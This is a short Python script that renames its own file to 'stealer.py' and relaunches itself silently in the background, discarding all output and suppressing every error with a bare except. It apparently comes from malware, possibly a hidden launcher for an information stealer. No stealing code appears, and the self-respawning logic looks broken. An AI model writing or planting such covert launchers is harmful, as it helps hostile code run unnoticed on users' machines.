import os
import subprocess

def run():
    try:
        s_path = os.path.abspath(__file__)
        
        f_path = os.path.join(os.path.dirname(s_path), "stealer.py")
        os.rename(s_path, f_path)

        subprocess.Popen(["python3", f_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        
    except:
        pass


run()